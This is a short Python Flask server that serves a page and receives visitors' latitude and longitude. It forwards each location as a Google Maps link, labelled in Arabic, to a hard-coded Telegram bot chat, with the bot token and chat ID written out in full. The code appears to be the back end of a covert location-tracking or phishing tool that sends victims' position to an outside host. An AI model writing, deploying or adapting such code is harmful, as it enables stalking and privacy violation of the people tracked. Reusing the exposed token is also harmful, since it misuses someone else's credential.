from flask import Flask, request, send_from_directory
import requests

app = Flask(__name__)

BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
CHAT_ID = '7485197107'

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/location', methods=['POST'])
def location():
    data = request.json
    lat = data.get('latitude'); lon = data.get('longitude')
    message = f"📍 موقع جديد:\nhttps://maps.google.com/?q={lat},{lon}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id':CHAT_ID,'text':message})
    return '',200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
